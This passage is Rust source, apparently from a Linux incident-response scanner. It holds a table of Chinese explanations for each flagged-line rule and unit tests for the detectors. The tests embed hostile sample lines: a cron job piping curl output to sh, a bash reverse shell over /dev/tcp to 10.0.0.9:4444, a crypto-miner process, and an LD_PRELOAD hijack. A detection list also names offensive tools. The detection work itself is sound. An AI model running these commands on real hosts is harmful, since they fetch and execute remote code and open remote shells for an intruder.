        high_connection_count as LineRule,
        "标红的计数已经到 500 以上，连接量异常。",
    ),
    (
        high_load as LineRule,
        "标红的负载已经到 8 以上，机器处于高压状态。",
    ),
    (
        high_utilisation as LineRule,
        "标红的使用率已经到 90% 以上，接近写满。",
    ),
    (
        host_mount as LineRule,
        "标红的容器挂载了宿主的敏感路径（docker.sock、/etc、/root、宿主根目录），可以直接影响宿主。",
    ),
    (
        host_override as LineRule,
        "标红的 hosts 记录把域名指到了非回环地址，可以把更新、下载这类请求劫持到别处。",
    ),
    (
        injected_environment as LineRule,
        "标红的环境变量会劫持动态库加载、丢弃命令历史或改走代理。",
    ),
    (
        insecure_mount as LineRule,
        "标红的挂载点对普通用户可写，却没有加 nosuid+nodev，可以在里面放 SUID 程序或设备节点。",
    ),
    (
        inside_container as LineRule,
        "标红的行说明这次连接进的是容器而不是宿主机，看到的东西只是容器内部。",
    ),
    (
        locked_attribute as LineRule,
        "标红的文件带着不可修改（i）或只可追加（a）属性，连 root 都改不动；攻击者常用它锁住后门。",
    ),
    (
        login_account as LineRule,
        "标红的账号要么是第二个 UID 0 的超级用户，要么是本该不能登录的系统账号被配上了交互 shell。",
    ),
    (
        offensive_tool_package as LineRule,
        "标红的是攻击类工具包（nmap、hydra、sqlmap、chisel 等），防守机器上不该装。",
    ),
    (
        password_never_set as LineRule,
        "标红的账号口令从未设置过，下次登录才会要求设置。",
    ),
    (
        passwordless_sudo as LineRule,
        "标红的 sudo 规则免口令，拿到该账号就等于拿到 root。",
    ),
    (
        pending_security_update as LineRule,
        "标红的是待打的安全更新，对应已公开的漏洞。",
    ),
    (
        permissive_firewall as LineRule,
        "标红的链默认放行，或者对 0.0.0.0/0 无条件放行。",
    ),
    (
        planted_file as LineRule,
        "标红的文件落在可写的临时目录里，或者带着执行位；这两种都是投放载荷的典型位置。",
    ),
    (
        policy_route as LineRule,
        "标红的是内核自带三条之外的自定义策略路由，或隧道设备；流量可能被引到别处。",
    ),
    (
        privilege_command_record as LineRule,
        "标红的记录是一次提权后打开了 shell，或者一次认证失败。",
    ),
    (
        privileged_group_listing as LineRule,
        "标红的特权组里有额外成员，加入 sudo、wheel、docker 这类组基本等同于拿到 root。",
    ),
    (
        privileged_group_member as LineRule,
        "标红的特权组里有额外成员，加入 sudo、wheel、docker 这类组基本等同于拿到 root。",
    ),
    (
        promiscuous_link as LineRule,
        "标红的网卡处于混杂模式，会收下不是发给自己的流量，通常意味着有人在抓包。",
    ),
    (
        proxy_setting as LineRule,
        "标红的配置给出网流量指定了代理，外发数据会先经过它。",
    ),
    (
        remote_execution_hint as LineRule,
        "标红的条目会下载并执行外部内容，或指向可写目录里的文件；计划任务和启动脚本里出现这些基本可以判定为植入。",
    ),
    (
        remote_session as LineRule,
        "标红的是来自网络的会话，或者没有终端的 root 会话；应急时先确认这些人是谁。",
    ),
    (
        risky_boot_parameter as LineRule,
        "标红的启动参数关掉了强制访问控制或地址随机化，也可能把 init 换成了 shell。",
    ),
    (
        risky_network_parameter as LineRule,
        "标红的内核参数放开了转发、重定向或源路由，或者关掉了反向路径校验、SYN cookie。",
    ),
    (
        risky_ssh_setting as LineRule,
        "标红的 SSH 配置放宽了远程登录：允许 root 直接登录、允许口令登录或允许空口令。",
    ),
    (
        runtime_warning as LineRule,
        "标红的是容器运行时自己报出的告警或未校验的镜像仓库。",
    ),
    (
        sensitive_symlink as LineRule,
        "标红的软链指向账号或认证相关的文件，可能被用来诱导程序读写敏感位置。",
    ),
    (
        service_anomaly as LineRule,
        "标红的单元被 masked（屏蔽安全服务是常见手法），或命中通用入侵特征。",
    ),
    (
        sgid_program as LineRule,
        "标红的行不在发行版自带的 SGID 名单内；这类程序会以属组身份运行，可能被用来越权读写。",
    ),
    (
        shared_writable_directory as LineRule,
        "标红的目录组或其他用户可写；如果它在 PATH 里，别人可以放同名程序劫持你的命令。",
    ),
    (
        short_log_retention as LineRule,
        "标红的轮转策略只保留一份历史，能追溯的时间窗很短。",
    ),
    (
        ssh_key_exposure as LineRule,
        "标红的密钥文件组或其他用户可写（别人能加公钥），或者私钥对别人可读。",
    ),
    (
        static_arp as LineRule,
        "标红的是手工固定的 ARP 表项，正常主机很少需要。",
    ),
    (
        sudo_grant as LineRule,
        "标红的 sudo 规则要么免口令，要么把全部权限给了常规管理组之外的账号。",
    ),
    (
        suid_program as LineRule,
        "标红的行不在发行版自带的 SUID 名单内，或不在系统目录下；这类程序能以 root 身份运行，常被用来留提权后门。",
    ),
    (
        suspicious_process as LineRule,
        "标红的进程运行在可写目录里，或命令行带着下载执行、反弹 shell、挖矿程序的特征。",
    ),
    (
        suspicious_socket as LineRule,
        "标红的连接落在常见的 handler 端口上，或者持有它的进程是 shell、解释器这类不该对外提供服务的程序。",
    ),
    (
        system_alert as LineRule,
        "标红的是崩溃、内存耗尽、内核异常或被拒绝的记录。",
    ),
    (
        tainted_kernel as LineRule,
        "标红的数值不为零，说明内核被污染过，通常是加载了树外模块。",
    ),
    (
        traffic_redirection as LineRule,
        "标红的规则会改写或转发流量，把这台机器变成跳板或中转。",
    ),
    (
        unhealthy_workload as LineRule,
        "标红的负载没有正常运行（崩溃重启、拉取失败、被驱逐等）。",
    ),
    (
        unowned_path as LineRule,
        "标红的文件没有对应的属主或属组，通常是账号被删后留下的，也可能是从别处拷进来的。",
    ),
    (
        unsynchronised_clock as LineRule,
        "标红的行说明时钟没有同步；时间不准，后面所有日志的时间比对都不可信。",
    ),
    (
        weak_hardening as LineRule,
        "标红的内核加固开关被调低了：地址随机化、内核指针保护、core dump 限制之一没开满。",
    ),
    (
        weak_password_policy as LineRule,
        "标红的策略允许空口令（nullok）或口令永不过期。",
    ),
    (
        world_writable_directory as LineRule,
        "标红的目录任何用户都能写，且丢了粘滞位或不在共享临时目录里；别人可以删改你放在里面的文件。",
    ),
    (
        world_writable_file as LineRule,
        "标红的文件任何用户都能改写，且不在 /tmp 这类共享临时目录里；配置或脚本被改写就等于被接管。",
    ),
];

/// The sentence explaining what this rule marks.
pub fn reason_for(rule: LineRule) -> Option<&'static str> {
    REASONS
        .iter()
        .find(|(candidate, _)| std::ptr::fn_addr_eq(*candidate, rule))
        .map(|(_, reason)| *reason)
}

#[cfg(test)]
mod tests {
    /// `lsattr -R` prints bare `path:` headers between its listings, and almost
    /// any path contains an "a" or an "i". Reading the attribute column instead
    /// of the whole line is what separates a real finding from all of /etc.
    #[test]
    fn locked_attribute_reads_the_attribute_column_not_the_path() {
        assert!(super::locked_attribute(
            "----i---------e----- /etc/backdoor.conf"
        ));
        assert!(super::locked_attribute(
            "-----a--------e----- /var/log/audit.log"
        ));
        assert!(!super::locked_attribute("--------------e----- /etc/passwd"));
        // Directory headers and error lines carry no attribute column.
        assert!(!super::locked_attribute("/etc/profile.d:"));
        assert!(!super::locked_attribute("/etc/apt/sources.list.d:"));
        assert!(!super::locked_attribute("lsattr: Operation not supported"));
        assert!(!super::locked_attribute(""));
    }

    /// arp_filter ends with rp_filter, so a suffix match read the kernel's own
    /// default as a disabled reverse-path filter on every host.
    #[test]
    fn risky_network_parameter_matches_the_leaf_name() {
        assert!(!super::risky_network_parameter(
            "net.ipv4.conf.all.arp_filter = 0"
        ));
        assert!(super::risky_network_parameter(
            "net.ipv4.conf.all.rp_filter = 0"
        ));
        assert!(!super::risky_network_parameter(
            "net.ipv4.conf.all.rp_filter = 2"
        ));
        assert!(super::risky_network_parameter("net.ipv4.ip_forward = 1"));
        assert!(super::risky_network_parameter(
            "net.ipv4.tcp_syncookies = 0"
        ));
        // Loopback cannot receive a redirect, so its settings say nothing.
        assert!(!super::risky_network_parameter(
            "net.ipv4.conf.lo.accept_redirects = 1"
        ));
        assert!(super::risky_network_parameter(
            "net.ipv4.conf.eth0.accept_redirects = 1"
        ));
    }

    /// Alpine ships around twenty locked system accounts, none of which carry
    /// aging data. Flagging all of them buried the one account that mattered.
    #[test]
    fn password_never_set_ignores_locked_system_accounts() {
        assert!(!super::password_never_set(
            "bin state=locked last= min=0 max="
        ));
        assert!(!super::password_never_set(
            "root state=set last=20690 min=0"
        ));
        assert!(super::password_never_set("backup2 state=empty last= min=0"));
        assert!(super::password_never_set("intruder state=set last=0 min=0"));
    }

    /// Debian and Ubuntu ship syslog in adm. Flagging it on every host is the
    /// kind of standing false positive that gets the highlight ignored.
    #[test]
    fn privileged_group_listing_excuses_only_the_shipped_pairing() {
        assert!(!super::privileged_group_listing("adm:x:4:syslog"));
        assert!(!super::privileged_group_listing("sudo:x:27:"));
        assert!(super::privileged_group_listing("sudo:x:27:deploy"));
        assert!(super::privileged_group_listing("docker:x:998:www-data"));
        // An extra member beside syslog is still a finding.
        assert!(super::privileged_group_listing("adm:x:4:syslog,attacker"));
        assert!(!super::privileged_group_listing("audio:x:29:"));
    }

    /// A symbolic link always lists as lrwxrwxrwx. Those bits belong to the
    /// link, so every permission rule has to skip them or /bin -> usr/bin reads
    /// as world-writable on a healthy host.
    #[test]
    fn permission_rules_ignore_symbolic_link_modes() {
        assert!(!super::shared_writable_directory(
            "lrwxrwxrwx 1 root root 8 Aug 10 14:50 /sbin -> usr/sbin"
        ));
        assert!(!super::world_writable_directory(
            "lrwxrwxrwx 1 root root 7 Aug 10 14:50 /bin -> usr/bin"
        ));
        // A real world-writable directory still counts.
        assert!(super::world_writable_directory(
            "drwxrwxrwx 2 root root 4096 Aug 25 14:51 /usr/local/lib/pyshared"
        ));
        assert!(super::shared_writable_directory(
            "drwxrwx--- 2 root staff 4096 Aug 25 14:51 /opt/shared"
        ));
    }

    use super::*;

    #[test]
    fn stock_privileged_programs_stay_quiet_and_planted_ones_do_not() {
        for normal in ["/usr/bin/passwd", "/bin/su", "/usr/bin/sudo", "/bin/mount"] {
            assert!(!suid_program(normal), "{normal}");
        }
        for abnormal in [
            "/usr/bin/find",
            "/tmp/.hidden/bash",
            "/home/ctf/rootshell",
            "/usr/local/bin/vim",
        ] {
            assert!(suid_program(abnormal), "{abnormal}");
        }
        assert!(!sgid_program("/usr/bin/wall"));
        assert!(sgid_program("/usr/bin/bash"));
    }

    #[test]
    fn writable_paths_are_judged_against_the_shared_temporary_areas() {
        assert!(!world_writable_file("/tmp/session.lock"));
        assert!(world_writable_file("/etc/passwd"));
        assert!(world_writable_file("/var/www/html/index.php"));

        let sticky = "  12 4 drwxrwxrwt 10 root root 4096 Aug 25 14:00 /tmp";
        let open = "  13 4 drwxrwxrwx 2 root root 4096 Aug 25 14:00 /var/www";
        let elsewhere = "  14 4 drwxrwxrwt 2 root root 4096 Aug 25 14:00 /opt/drop";
        assert!(!world_writable_directory(sticky));
        assert!(world_writable_directory(open));
        assert!(world_writable_directory(elsewhere));
    }

    #[test]
    fn account_files_flag_exposure_and_ownership_changes() {
        assert!(!account_file_mode(
            "-rw-r--r-- 1 root root 2842 Aug 25 10:00 /etc/passwd"
        ));
        assert!(!account_file_mode(
            "-rw-r----- 1 root shadow 1543 Aug 25 10:00 /etc/shadow"
        ));
        assert!(account_file_mode(
            "-rw-r--r-- 1 root root 1543 Aug 25 10:00 /etc/shadow"
        ));
        assert!(account_file_mode(
            "-rw-rw-r-- 1 root root 2842 Aug 25 10:00 /etc/passwd"
        ));
        assert!(account_file_mode(
            "-rw-r--r-- 1 ctf root 2842 Aug 25 10:00 /etc/passwd"
        ));
        assert!(account_file_mode(
            "-r--r--r-- 1 root root 755 Aug 25 10:00 /etc/sudoers"
        ));
    }

    #[test]
    fn capability_acl_attribute_and_sudo_rules_only_mark_real_grants() {
        assert!(file_capability("/usr/bin/python3.11 cap_setuid=ep"));
        assert!(!file_capability("/usr/bin/ping cap_net_raw=ep"));
        assert!(file_capability("/opt/tool cap_net_raw=ep"));

        assert!(acl_grant("user:alice:rwx"));
        assert!(!acl_grant("user::rw-"));
        assert!(!acl_grant("other::r--"));

        assert!(locked_attribute(
            "----ia-------e---- /root/.ssh/authorized_keys"
        ));
        assert!(!locked_attribute("-------------e---- /etc/hosts"));

        assert!(passwordless_sudo(
            "/etc/sudoers:25:ctf ALL=(ALL) NOPASSWD: ALL"
        ));
        assert!(!passwordless_sudo("/etc/sudoers:20:root ALL=(ALL:ALL) ALL"));
    }

    #[test]
    fn key_files_flag_shared_write_and_readable_private_keys() {
        assert!(!ssh_key_exposure(
            "-rw------- 1 root root 2602 Aug 25 10:00 id_rsa"
        ));
        assert!(ssh_key_exposure(
            "-rw-r--r-- 1 root root 2602 Aug 25 10:00 id_rsa"
        ));
        assert!(!ssh_key_exposure(
            "-rw-r--r-- 1 root root 566 Aug 25 10:00 id_rsa.pub"
        ));
        assert!(ssh_key_exposure(
            "-rw-rw-r-- 1 root root 566 Aug 25 10:00 authorized_keys"
        ));
    }

    #[test]
    fn accounts_flag_extra_superusers_open_shells_and_broad_sudo() {
        assert!(login_account("ctf\t0\t0\t/home/ctf\t/bin/bash"));
        assert!(!login_account("root\t0\t0\t/root\t/bin/bash"));
        assert!(login_account("backup\t34\t34\t/var/backups\t/bin/bash"));
        assert!(!login_account(
            "backup\t34\t34\t/var/backups\t/usr/sbin/nologin"
        ));
        assert!(!login_account("alice\t1000\t1000\t/home/alice\t/bin/bash"));

        assert!(extra_root_account("toor\t0\t/bin/bash"));
        assert!(!extra_root_account("root\t0\t/bin/bash"));

        assert!(empty_password("ctf"));
        assert!(!empty_password("root\t!"));

        assert!(privileged_group_member("sudo:x:27:alice"));
        assert!(!privileged_group_member("sudo:x:27:"));

        assert!(sudo_grant("/etc/sudoers:25:ctf ALL=(ALL) NOPASSWD: ALL"));
        assert!(sudo_grant("/etc/sudoers:26:ctf ALL=(ALL:ALL) ALL"));
        assert!(!sudo_grant("/etc/sudoers:20:root ALL=(ALL:ALL) ALL"));
        assert!(!sudo_grant("/etc/sudoers:21:%sudo ALL=(ALL:ALL) ALL"));

        assert!(risky_ssh_setting("permitrootlogin yes"));
        assert!(!risky_ssh_setting("permitrootlogin no"));
        assert!(weak_password_policy(
            "/etc/pam.d/common-auth:5:auth sufficient pam_unix.so nullok"
        ));
        assert!(privilege_command_record("sudo: ctf : COMMAND=/bin/bash"));
        assert!(privilege_command_record(
            "sshd: pam_unix authentication failure for root"
        ));

        assert!(account_file_exposure(
            "/etc/shadow mtime=2026-08-25 uid=root mode=644"
        ));
        assert!(!account_file_exposure(
            "/etc/shadow mtime=2026-08-25 uid=root mode=640"
        ));
        assert!(account_file_exposure(
            "/etc/passwd mtime=2026-08-25 uid=ctf mode=644"
        ));
    }

    #[test]
    fn network_rules_flag_handlers_redirection_and_widened_switches() {
        assert!(suspicious_socket(
            "tcp LISTEN 0 1 0.0.0.0:4444 0.0.0.0:* users:((\"python3\",pid=901,fd=3))"
        ));
        assert!(suspicious_socket(
            "tcp LISTEN 0 1 0.0.0.0:9000 0.0.0.0:* users:((\"bash\",pid=902,fd=3))"
        ));
        assert!(!suspicious_socket(
            "tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:((\"sshd\",pid=800,fd=3))"
        ));
        assert!(suspicious_socket("nc 1234 root 3u IPv4 TCP 10.0.0.5:5555"));

        assert!(promiscuous_link("2: eth0: <BROADCAST,PROMISC,UP> mtu 1500"));
        assert!(!promiscuous_link(
            "2: eth0: <BROADCAST,MULTICAST,UP> mtu 1500"
        ));

        assert!(host_override("10.0.0.9 update.example.com"));
        assert!(!host_override("127.0.0.1 localhost"));
        assert!(!host_override("nameserver 10.0.0.1"));

        assert!(traffic_redirection("MASQUERADE all -- 0.0.0.0/0 0.0.0.0/0"));
        assert!(risky_network_parameter("net.ipv4.ip_forward = 1"));
        assert!(!risky_network_parameter("net.ipv4.ip_forward = 0"));
        assert!(risky_network_parameter("net.ipv4.conf.all.rp_filter = 0"));
        assert!(proxy_setting("http_proxy=http://10.0.0.9:8080"));
    }

    #[test]
    fn process_and_persistence_rules_flag_staged_and_fetched_payloads() {
        assert!(suspicious_process("root 901 1 90 /tmp/.x/kworker"));
        assert!(suspicious_process("root 902 1 99 ./xmrig --donate-level 1"));
        assert!(!suspicious_process("root 800 1 0 /usr/sbin/sshd -D"));

        assert!(remote_execution_hint(
            "*/5 * * * * root curl http://10.0.0.9/a | sh"
        ));
        assert!(remote_execution_hint(
            "/etc/profile.d/x.sh:3:bash -i >& /dev/tcp/10.0.0.9/4444 0>&1"
        ));
        assert!(!remote_execution_hint(
            "*/5 * * * * root /usr/local/bin/backup.sh"
        ));
    }

    #[test]
    fn log_and_file_rules_flag_break_ins_sweeps_and_emptied_evidence() {
        assert!(authentication_alert(
            "sshd[1]: Failed password for root from 10.0.0.9"
        ));
        assert!(!authentication_alert(
            "sshd[1]: Server listening on 0.0.0.0 port 22"
        ));
        assert!(accepted_login(
            "sshd[1]: Accepted password for ctf from 10.0.0.9"
        ));
        assert!(!accepted_login(
            "sshd[1]: Accepted publickey for alice from 10.0.0.2"
        ));
        assert!(frequent_source("  42 10.0.0.9"));
        assert!(!frequent_source("   3 10.0.0.2"));
        assert!(system_alert("kernel: nginx[900]: segfault at 0 ip 00007f"));
        assert!(emptied_log(
            "-rw-r----- 1 root adm 0 Aug 25 10:00 /var/log/btmp"
        ));
        assert!(!emptied_log(
            "-rw-r----- 1 root adm 4096 Aug 25 10:00 /var/log/btmp"
        ));
        assert!(audit_failure("type=USER_LOGIN msg=audit(1): res=failed"));

        assert!(planted_file(
            "  12 4 -rwxr-xr-x 1 root root 900 Aug 25 /usr/local/bin/x"
        ));
        assert!(planted_file(
            "  13 4 -rw-r--r-- 1 root root 900 Aug 25 /tmp/payload"
        ));
        assert!(!planted_file(
            "  14 4 -rw-r--r-- 1 root root 900 Aug 25 /etc/hosts"
        ));
        assert!(sensitive_symlink(
            "lrwxrwxrwx 1 root root 11 Aug 25 x -> /etc/passwd"
        ));
    }

    #[test]
    fn container_and_system_rules_flag_lowered_isolation_and_hardening() {
        assert!(container_privilege(
            "/app privileged=true pid=host net=bridge"
        ));
        assert!(!container_privilege(
            "/app privileged=false pid=private net=bridge"
        ));
        assert!(host_mount("/app /var/run/docker.sock:/var/run/docker.sock"));
        assert!(host_mount("/app /:/host"));
        assert!(!host_mount("/app /srv/data:/data"));
        assert!(container_daemon_risk("docker:x:999:ctf"));
        assert!(!container_daemon_risk("docker:x:999:"));

        assert!(injected_environment("LD_PRELOAD=/tmp/x.so"));
        assert!(!injected_environment("PATH=/usr/bin:/bin"));
        assert!(weak_hardening("kernel.randomize_va_space = 0"));
        assert!(!weak_hardening("kernel.randomize_va_space = 2"));
        assert!(weak_hardening("fs.suid_dumpable = 2"));
        assert!(disabled_mac("SELinux status: disabled"));
        assert!(risky_boot_parameter(
            "BOOT_IMAGE=/vmlinuz root=/dev/sda1 selinux=0"
        ));
        assert!(tainted_kernel("4096"));
        assert!(!tainted_kernel("0"));
    }

    /// The shared baseline for listing commands has to stay silent on a clean
    /// host, or the highlight stops meaning anything.
    #[test]
    fn compromise_markers_stay_quiet_on_ordinary_inventory() {
        for ordinary in [
            "ii  openssh-server  1:9.2p1-2  amd64  secure shell server",
            "  1234567  4 -rw-r--r--  1 root root  4096 Aug 25 10:00 /etc/hosts",
            "default via 192.168.1.1 dev eth0 proto dhcp",
            "sshd.service                     enabled  enabled",
            "nginx  latest  8f2c1a9d  2 weeks ago  187MB",
        ] {
            assert!(!compromise_marker(ordinary), "{ordinary}");
        }
        for planted in [
            "  12 4 -rwxr-xr-x 1 root root 900 Aug 25 /tmp/.x/kworker",
            "*/5 * * * * root curl http://10.0.0.9/a | sh",
            "root 902 99 ./xmrig --donate-level 1",
            "tcp LISTEN 0 1 0.0.0.0:4444 0.0.0.0:*",
        ] {
            assert!(compromise_marker(planted), "{planted}");
        }
    }

    #[test]
    fn routing_firewall_and_service_listings_flag_only_deviations() {
        assert!(!policy_route("0:\tfrom all lookup local"));
        assert!(!policy_route("32766:\tfrom all lookup main"));
        assert!(policy_route("100:\tfrom 10.0.0.9 lookup 200"));
        assert!(policy_route("10.8.0.0/24 dev tun0 scope link"));

        assert!(permissive_firewall("Chain INPUT (policy ACCEPT)"));
        assert!(!permissive_firewall("Chain INPUT (policy DROP)"));

        assert!(service_anomaly(
            "firewalld.service               masked   alias"
        ));
        assert!(!service_anomaly(
            "sshd.service                    enabled  enabled"
        ));
    }

    #[test]
    fn capacity_mount_and_clock_rules_flag_real_operational_faults() {
        assert!(high_utilisation("/dev/sda1 ext4 40G 38G 1.2G 97% /"));
        assert!(!high_utilisation("/dev/sda1 ext4 40G 12G 26G 32% /"));

        assert!(insecure_mount("/tmp /dev/sda2 ext4 rw,relatime"));
        assert!(!insecure_mount(
            "/tmp /dev/sda2 ext4 rw,nosuid,nodev,noexec"
        ));
        assert!(!insecure_mount("/ /dev/sda1 ext4 rw,relatime"));

        assert!(unsynchronised_clock("System clock synchronized: no"));
        assert!(!unsynchronised_clock("System clock synchronized: yes"));

        assert!(high_load("12.40 8.11 6.02 3/512 9001"));
        assert!(!high_load("0.42 0.31 0.28 1/312 9001"));

        assert!(core_dump_enabled(
            "core file size          (blocks, -c) unlimited"
        ));
        assert!(short_log_retention("rotate 1"));
        assert!(!short_log_retention("rotate 12"));
        assert!(boot_event("system boot  6.1.0-18-amd64  Mon Aug 25 09:00"));
    }

    #[test]
    fn account_and_container_listings_flag_access_paths() {
        assert!(remote_session("root pts/0 10.0.0.9 09:12 2.00s w"));
        assert!(!remote_session("alice tty1 - 09:00 1:20m bash"));

        assert!(privileged_group_listing("docker:x:999:ctf"));
        assert!(!privileged_group_listing("docker:x:999:"));
        assert!(!privileged_group_listing("users:x:100:alice"));

        assert!(authorized_key("ssh-ed25519 AAAAC3NzaC1lZDI1 ctf@kali"));
        assert!(!authorized_key("--- /root/.ssh/authorized_keys ---"));

        assert!(password_never_set("ctf last=0 min=0 max=99999 warn=7"));
        assert!(!password_never_set(
            "root last=19000 min=0 max=99999 warn=7"
        ));

        assert!(external_account_source("passwd: files ldap"));
        assert!(!external_account_source("passwd: files systemd"));

        assert!(inside_container("/docker/3f2a1b"));
        assert!(dangling_image("<none> <none> 8f2c1a9d 2 weeks ago 187MB"));
        assert!(exposed_container_port("web 0.0.0.0:8080->80/tcp"));
        assert!(unhealthy_workload(
            "kube-system pod-a 0/1 CrashLoopBackOff 7 2m"
        ));
        assert!(runtime_warning("WARNING: No swap limit support"));
        assert!(offensive_tool_package(
            "ii  nmap  7.93+dfsg1-1  amd64  network mapper"
        ));
        assert!(!offensive_tool_package(
            "ii  nano  7.2-1  amd64  small editor"
        ));
        assert!(pending_security_update(
            "openssl/stable-security 3.0.15-1~deb12u1"
        ));
    }

    #[test]
    fn every_rule_can_say_why_it_marked_a_line() {
        for (rule, reason) in REASONS {
            assert!(!reason.is_empty());
            assert!(reason.len() <= 512, "{reason}");
            assert!(!reason.contains('\n'));
            assert_eq!(reason_for(*rule), Some(*reason));
        }
        // The table is keyed by function pointer, so a rule that is not in it
        // has to come back empty rather than borrow a neighbour's sentence.
        fn unlisted(_line: &str) -> bool {
            false
        }
        assert_eq!(reason_for(unlisted as LineRule), None);
    }

    #[test]
    fn fallback_and_separator_lines_never_become_findings() {
        let output = "--- 用户密钥 ---\ngetfacl 不可用\n/tmp/.hidden/bash\n\n";
        assert_eq!(finding_lines(output, Some(suid_program)), vec![2]);
        assert!(finding_lines(output, None).is_empty());
    }

    #[test]
    fn marks_stay_bounded_and_ordered() {
        let output = (0..MAX_FINDING_LINES + 50)
            .map(|index| format!("/tmp/planted-{index}"))
            .collect::<Vec<_>>()
            .join("\n");
        let marks = finding_lines(&output, Some(suid_program));
        assert_eq!(marks.len(), MAX_FINDING_LINES);
        assert!(marks.windows(2).all(|pair| pair[0] < pair[1]));
    }
}
